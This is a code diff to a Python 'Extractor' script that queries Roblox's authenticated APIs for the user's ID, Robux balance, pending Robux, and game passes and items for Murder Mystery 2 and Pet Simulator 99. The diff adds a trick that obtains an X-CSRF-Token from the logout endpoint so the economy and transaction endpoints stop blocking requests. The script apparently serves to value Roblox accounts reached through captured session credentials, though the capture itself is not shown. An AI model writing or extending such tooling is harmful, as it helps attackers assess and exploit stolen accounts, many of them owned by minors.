@@ -18,6 +18,18 @@ def safe_get(url, headers=None):
         pass
     return None
 
+def get_csrf_token(headers):
+    """Fetch Roblox X-CSRF-Token required for economy & transaction endpoints"""
+    try:
+        req = urllib.request.Request("https://auth.roblox.com/v1/logout", data=b"", headers=headers, method="POST")
+        with urllib.request.urlopen(req, timeout=5) as res:
+            pass
+    except urllib.error.HTTPError as e:
+        return e.headers.get("x-csrf-token", "")
+    except Exception:
+        pass
+    return ""
+
 def main():
     try:
         print("DEBUG: Python Extractor started", file=sys.stderr)
@@ -52,6 +64,11 @@ def main():
             "Origin": "https://www.roblox.com/",
             "Accept": "application/json, text/plain, */*"
         }
+
+        # Inject CSRF Token so economy/transaction endpoints don't return 403 blocks
+        csrf_token = get_csrf_token(headers)
+        if csrf_token:
+            headers["X-CSRF-Token"] = csrf_token
 
         user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
         
@@ -88,7 +105,7 @@ def main():
             if economy_data:
                 robux_balance = economy_data.get("robux", 0)
 
-            # Fetch Pending Robux
+            # Fetch Pending Robux (Fixed with CSRF)
             totals_data = safe_get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?transactionType=summary", headers)
             if totals_data:
                 pending_robux = totals_data.get("pendingRobux", 0)
@@ -124,8 +141,6 @@ def main():
                                 mm2_passes += 1
                             if any(k in item_name for k in ["pet simulator", "ps99", "exclusive pet", "huge pet"]):
                                 ps99_passes += 1
-                        else:
-                            break
                     except Exception:
                         continue
                 
